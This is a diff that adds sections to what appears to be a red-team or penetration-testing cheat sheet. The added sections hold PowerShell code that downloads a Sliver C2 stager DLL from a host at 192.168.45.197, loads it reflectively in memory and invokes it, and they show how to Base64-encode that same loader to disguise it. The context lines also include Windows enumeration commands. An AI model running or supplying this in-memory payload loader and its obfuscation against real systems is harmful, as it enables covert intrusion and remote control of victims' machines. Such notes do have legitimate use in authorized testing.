@@ -65,3 +65,27 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName
 ```
 
+
+### Execute in memory
+
+- Download and execute a dll
+```powershell
+$assembly = [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://192.168.45.197:8000/SliverStagerDll.dll')); $class = $assembly.GetType('GoodShip.GoodShip'); $method = $class.GetMethod('LoadStager'); $method.Invoke($null, $null)
+```
+
+
+## Powershell Base64 Conversion
+
+```powershell
+$script = @"
+\$webClient = New-Object System.Net.WebClient
+\$dllBytes = \$webClient.DownloadData('http://192.168.45.197:8000/SliverStagerDll.dll')
+\$assembly = [System.Reflection.Assembly]::Load(\$dllBytes)
+\$goodShipType = \$assembly.GetType('GoodShip.GoodShip')
+\$loadStagerMethod = \$goodShipType.GetMethod('LoadStager')
+\$loadStagerMethod.Invoke(\$null, \$null)
+"@
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
+$encodedScript = [Convert]::ToBase64String($bytes)
+$encodedScript
+```
